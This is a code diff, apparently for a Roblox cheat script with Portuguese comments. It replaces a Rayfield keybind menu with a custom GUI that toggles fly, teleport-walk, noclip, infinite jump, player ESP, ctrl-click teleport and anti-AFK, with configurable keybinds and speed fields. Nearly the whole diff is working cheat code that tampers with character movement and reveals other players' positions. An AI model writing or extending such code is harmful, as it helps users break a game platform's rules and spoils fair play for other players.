-MainTab:CreateKeybind({
-    Name = "Toggle Fly (Padrão: P)",
-    CurrentKeybind = "P",        -- Alterado para P
-    Callback = function()
-        FlyToggle:Set(not FlyToggle.CurrentValue)
-    end
-})
-
-MainTab:CreateKeybind({
-    Name = "Toggle Noclip (Padrão: L)",
-    CurrentKeybind = "L",        -- Alterado para L
-    Callback = function()
-        NoclipToggle:Set(not NoclipToggle.CurrentValue)
-    end
-})
-
-MainTab:CreateKeybind({
-    Name = "Toggle Inf Jump (Padrão: 9)",
-    CurrentKeybind = "Nine",     -- Alterado para 9
-    Callback = function()
-        infJumpEnabled = not infJumpEnabled
-        Rayfield:Notify({Title = "Inf Jump", Content = infJumpEnabled and "ON" or "OFF", Duration = 2})
-    end
-})
-
--- Infinite Jump
-game:GetService("UserInputService").JumpRequest:Connect(function()
-    if infJumpEnabled and humanoid then
-        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+RunService.Heartbeat:Connect(function(deltaTime)
+    if tpWalkEnabled then
+        local _, myRoot, myHum = getLocalCharacterData()
+        if myHum and myRoot and myHum.MoveDirection.Magnitude > 0 then
+            local movePosition = myHum.MoveDirection * (tpWalkSpeed * deltaTime)
+            myRoot.CFrame = myRoot.CFrame + movePosition
+        end
     end
 end)
 
-Rayfield:Notify({Title = "Script OK!", Content = "Keybinds atualizadas: P | L | 9", Duration = 5})
+local virtualUser = game:GetService("VirtualUser")
+LocalPlayer.Idled:Connect(function()
+    if antiAfkEnabled then
+        virtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+        task.wait(1)
+        virtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+    end
+end)
+
+-- ==================== CONSTRUTORES DE UI ====================
+local function createRow(name, keyConfigName, hasKeybind, callback)
+    local state = false
+    local isBinding = false
+
+    local rowFrame = Instance.new("Frame")
+    rowFrame.Size = UDim2.new(1, -6, 0, 50)
+    rowFrame.BackgroundColor3 = Colors.Card
+    rowFrame.BorderSizePixel = 0
+    rowFrame.Parent = Container
+
+    local rowCorner = Instance.new("UICorner")
+    rowCorner.CornerRadius = UDim.new(0, 8)
+    rowCorner.Parent = rowFrame
+
+    local rowStroke = Instance.new("UIStroke")
+    rowStroke.Color = Colors.Border
+    rowStroke.Thickness = 1
+    rowStroke.Parent = rowFrame
+
+    local toggleBtn = Instance.new("TextButton")
+    toggleBtn.Size = hasKeybind and UDim2.new(0.65, 0, 1, 0) or UDim2.new(1, 0, 1, 0)
+    toggleBtn.BackgroundTransparency = 1
+    toggleBtn.Text = "  " .. name
+    toggleBtn.TextColor3 = Colors.TextMuted
+    toggleBtn.TextSize = 14
+    toggleBtn.Font = Enum.Font.GothamMedium
+    toggleBtn.TextXAlignment = Enum.TextXAlignment.Left
+    toggleBtn.Parent = rowFrame
+
+    local statusIndicator = Instance.new("Frame")
+    statusIndicator.Size = UDim2.new(0, 8, 0, 8)
+    statusIndicator.Position = hasKeybind and UDim2.new(1, -20, 0.5, -4) or UDim2.new(1, -30, 0.5, -4)
+    statusIndicator.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
+    statusIndicator.BorderSizePixel = 0
+    statusIndicator.Parent = toggleBtn
+    
+    local indCorner = Instance.new("UICorner")
+    indCorner.CornerRadius = UDim.new(1, 0)
+    indCorner.Parent = statusIndicator
+
+    local function action(forcedState)
+        state = (forcedState ~= nil) and forcedState or (not state)
+        if state then
+            toggleBtn.TextColor3 = Colors.Text
+            statusIndicator.BackgroundColor3 = Color3.fromRGB(34, 197, 94)
+            rowStroke.Color = Colors.AccentDim
+        else
+            toggleBtn.TextColor3 = Colors.TextMuted
+            statusIndicator.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
+            rowStroke.Color = Colors.Border
+        end
+        callback(state)
+    end
+
+    toggleBtn.MouseButton1Click:Connect(function() action() end)
+
+    if hasKeybind then
+        local bindBtn = Instance.new("TextButton")
+        bindBtn.Size = UDim2.new(0.28, 0, 0.6, 0)
+        bindBtn.Position = UDim2.new(0.7, -15, 0.2, 0)
+        bindBtn.BackgroundColor3 = Colors.Background
+        bindBtn.Text = Keys[keyConfigName].Name
+        bindBtn.TextColor3 = Colors.Accent
+        bindBtn.Font = Enum.Font.GothamBold
+        bindBtn.TextSize = 12
+        bindBtn.Parent = rowFrame
+
+        local bindCorner = Instance.new("UICorner")
+        bindCorner.CornerRadius = UDim.new(0, 6)
+        bindCorner.Parent = bindBtn
+        
+        local bindStroke = Instance.new("UIStroke")
+        bindStroke.Color = Colors.Border
+        bindStroke.Thickness = 1
+        bindStroke.Parent = bindBtn
+
+        bindBtn.MouseButton1Click:Connect(function()
+            if isBinding then return end
+            isBinding = true
+            bindBtn.Text = "..."
+            bindBtn.TextColor3 = Colors.TextMuted
+            
+            local connection
+            connection = UIS.InputBegan:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.Keyboard then
+                    Keys[keyConfigName] = input.KeyCode
+                    bindBtn.Text = input.KeyCode.Name
+                    bindBtn.TextColor3 = Colors.Accent
+                    isBinding = false
+                    connection:Disconnect()
+                end
+            end)
+        end)
+    end
+
+    return { Trigger = action }
+end
+
+local function createValueInputRow(titleLabel, defaultValue, callback)
+    local row = Instance.new("Frame")
+    row.Size = UDim2.new(1, -6, 0, 50)
+    row.BackgroundColor3 = Colors.Card
+    row.BorderSizePixel = 0
+    row.Parent = Container
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = row
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Colors.Border
+    stroke.Thickness = 1
+    stroke.Parent = row
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0.6, 0, 1, 0)
+    label.Position = UDim2.new(0, 12, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = titleLabel
+    label.TextColor3 = Colors.TextMuted
+    label.Font = Enum.Font.GothamMedium
+    label.TextSize = 14
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Parent = row
+
+    local boxInput = Instance.new("TextBox")
+    boxInput.Size = UDim2.new(0.28, 0, 0.6, 0)
+    boxInput.Position = UDim2.new(0.7, -15, 0.2, 0)
+    boxInput.BackgroundColor3 = Colors.Background
+    boxInput.Text = tostring(defaultValue)
+    boxInput.TextColor3 = Colors.Text
+    boxInput.Font = Enum.Font.GothamBold
+    boxInput.TextSize = 12
+    boxInput.Parent = row
+
+    local inCorner = Instance.new("UICorner")
+    inCorner.CornerRadius = UDim.new(0, 6)
+    inCorner.Parent = boxInput
+
+    local inStroke = Instance.new("UIStroke")
+    inStroke.Color = Colors.Border
+    inStroke.Thickness = 1
+    inStroke.Parent = boxInput
+
+    boxInput.FocusLost:Connect(function()
+        local num = tonumber(boxInput.Text)
+        if num then
+            local validated = callback(num)
+            boxInput.Text = tostring(validated)
+        else
+            callback(nil)
+        end
+    end)
+end
+
+-- ==================== CONSTRUÇÃO DA UI ====================
+local flyRow = createRow("Fly Mode", "Fly", true, function(state)
+    if state then startFly() else stopFly() end
+end)
+
+createValueInputRow("Fly Speed", flySpeed, function(value)
+    if value then flySpeed = math.clamp(value, 10, 5000) end
+    return flySpeed
+end)
+
+local tpWalkRow = createRow("TPWalk", "TpWalk", true, function(state)
+    tpWalkEnabled = state
+end)
+
+createValueInputRow("TPWalk Speed", tpWalkSpeed, function(value)
+    if value then tpWalkSpeed = math.clamp(value, 10, 1000) end
+    return tpWalkSpeed
+end)
+
+local noclipRow = createRow("Noclip", "Noclip", true, function(state)
+    toggleNoclip(state)
+end)
+
+local infJumpRow = createRow("Infinite Jump", "InfJump", true, function(state)
+    infJumpEnabled = state
+end)
+
+local espRow = createRow("ESP Premium (MD + Dist)", "ESP", true, function(state)
+    espEnabled = state
+    for _, data in pairs(tracked) do
+        if data.billboard then data.billboard.Enabled = espEnabled end
+    end
+end)
+
+local clickTpRow = createRow("Click TP (Ctrl + Clique)", "ClickTp", false, function(state)
+    clickTpEnabled = state
+end)
+
+local antiAfkRow = createRow("Anti-AFK (Desconexão)", "AntiAfk", false, function(state)
+    antiAfkEnabled = state
+end)
+
+createValueInputRow("Field of View (FOV)", currentFov, function(value)
+    if value then 
+        currentFov = math.clamp(value, 30, 120)
+    end
+    return currentFov
+end)
+
+-- ==================== SENSOR DE ENTRADA CONFIGURADO ====================
+UIS.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end 
+    
+    if input.KeyCode == Keys.Fly then
+        flyRow.Trigger()
+    elseif input.KeyCode == Keys.TpWalk then
+        tpWalkRow.Trigger()
+    elseif input.KeyCode == Keys.Noclip then
+        noclipRow.Trigger()
+    elseif input.KeyCode == Keys.InfJump then
+        infJumpRow.Trigger()
+    elseif input.KeyCode == Keys.ESP then
+        espRow.Trigger()
+    elseif input.KeyCode == Enum.KeyCode.F8 then
+        MainFrame.Visible = not MainFrame.Visible
+    end
+
+    if input.UserInputType == Enum.UserInputType.MouseButton1 and clickTpEnabled then
+        if UIS:IsKeyDown(Enum.KeyCode.LeftControl) or UIS:IsKeyDown(Enum.KeyCode.RightControl) then
+            local _, myRoot, _ = getLocalCharacterData()
+            local mouse = LocalPlayer:GetMouse()
+            if myRoot and mouse and mouse.Target then
+                myRoot.CFrame = CFrame.new(mouse.Hit.X, mouse.Hit.Y + 3, mouse.Hit.Z)
+            end
+        end
+    end
+end)
+
+UIS.JumpRequest:Connect(function()
+    if infJumpEnabled then
+        local _, _, myHum = getLocalCharacterData()
+        if myHum then
+            myHum:ChangeState(Enum.HumanoidStateType.Jumping)
+        end
+    end
+end)
